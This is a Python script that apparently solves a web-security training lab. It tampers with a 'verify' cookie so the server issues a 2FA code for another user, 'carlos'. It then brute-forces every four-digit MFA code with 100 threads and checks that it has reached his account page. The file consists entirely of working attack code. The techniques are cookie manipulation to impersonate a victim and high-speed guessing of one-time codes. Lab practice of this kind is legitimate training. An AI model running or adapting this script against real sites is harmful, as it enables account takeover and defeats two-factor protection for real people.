import requests
import urllib3
import time
import threading
import queue

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE_URL = "https://0ae200a4036a61e18051127200a600b7.web-security-academy.net/"  # <-- update this
LOGIN_PATH = "/login"
LOGIN2_PATH = "/login2"
ACCOUNT_PATH = "/my-account"

MY_USERNAME = "wiener"
MY_PASSWORD = "peter"
VICTIM_USERNAME = "carlos"

THREADS = 100


# ============================================================
# STEP 1 — log in, grab the session cookie value as a plain string
# ============================================================
def login_as_self():
    print("Logging in as self to establish a session...")
    s = requests.Session()
    s.verify = False
    resp = s.post(
        BASE_URL + LOGIN_PATH,
        data={"username": MY_USERNAME, "password": MY_PASSWORD},
        allow_redirects=False
    )
    print(f"  Login status: {resp.status_code}")
    session_id = s.cookies.get("session")
    print(f"  Extracted session id: {session_id}")
    if resp.status_code != 302 or not session_id:
        raise Exception("Login failed — check credentials or lab URL.")
    return session_id


# ============================================================
# STEP 2 — trigger code generation for carlos, using EXPLICIT cookies dict
# ============================================================
def trigger_victim_code(session_id):
    print(f"Triggering 2FA code generation for '{VICTIM_USERNAME}'...")
    cookies = {"session": session_id, "verify": VICTIM_USERNAME}
    resp = requests.get(
        BASE_URL + LOGIN2_PATH,
        cookies=cookies,
        verify=False,
        allow_redirects=False
    )
    print(f"  /login2 status: {resp.status_code}")
    print(f"  Cookies WE SENT: {cookies}")
    # Note: we deliberately do NOT read back resp.cookies here,
    # because we don't want the server's Set-Cookie to influence anything —
    # we're going to keep forcing 'verify': 'carlos' manually from now on.


# ============================================================
# STEP 3 — threaded brute force, explicit cookies on every request
# ============================================================
result = {"code": None}
result_lock = threading.Lock()
stop_flag = threading.Event()


def worker(session_id, code_queue):
    cookies = {"session": session_id, "verify": VICTIM_USERNAME}

    while not stop_flag.is_set():
        try:
            code = code_queue.get_nowait()
        except queue.Empty:
            return

        try:
            resp = requests.post(
                BASE_URL + LOGIN2_PATH,
                data={"mfa-code": code},
                cookies=cookies,  # explicit every time — never inherited, never mutated
                verify=False,
                allow_redirects=False,
                timeout=10
            )
        except requests.RequestException:
            continue

        if resp.status_code == 302:
            with result_lock:
                if result["code"] is None:
                    result["code"] = code
                    print(f"\n  >>> SUCCESS: mfa-code = {code}")
                    print(f"  >>> Redirect location: {resp.headers.get('Location')}")
                    stop_flag.set()
            return


def brute_force_mfa_code(session_id):
    print(f"Starting threaded brute force ({THREADS} threads)...")
    start = time.time()

    code_queue = queue.Queue()
    for i in range(10000):
        code_queue.put(f"{i:04d}")

    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=worker, args=(session_id, code_queue))
        t.start()
        threads.append(t)

    total = 10000
    while any(t.is_alive() for t in threads):
        remaining = code_queue.qsize()
        done = total - remaining
        elapsed = time.time() - start
        print(f"  Progress: {done}/{total}  elapsed={elapsed:.1f}s", end="\r")
        time.sleep(1)
        if stop_flag.is_set():
            break

    for t in threads:
        t.join(timeout=5)

    elapsed = time.time() - start
    print(f"\nBrute force finished in {elapsed:.1f}s")
    return result["code"]


# ============================================================
# STEP 4 — verify final access
# ============================================================
def verify_access(session_id, code):
    cookies = {"session": session_id, "verify": VICTIM_USERNAME}
    resp = requests.post(
        BASE_URL + LOGIN2_PATH,
        data={"mfa-code": code},
        cookies=cookies,
        verify=False,
        allow_redirects=False
    )
    print(f"Final login status: {resp.status_code}")

    account_resp = requests.get(
        BASE_URL + ACCOUNT_PATH,
        cookies=cookies,
        verify=False
    )
    print(f"/my-account status: {account_resp.status_code}")
    if "carlos" in account_resp.text.lower():
        print(">>> Confirmed: accessing carlos's account. Lab should be solved.")
    else:
        print("Could not confirm carlos's content — check manually in browser.")


# ============================================================
# MAIN
# ============================================================
if __name__ == "__main__":
    session_id = login_as_self()
    trigger_victim_code(session_id)
    found_code = brute_force_mfa_code(session_id)

    if found_code:
        verify_access(session_id, found_code)
    else:
        print("No valid code found. Check that 'verify' cookie logic is working correctly.")
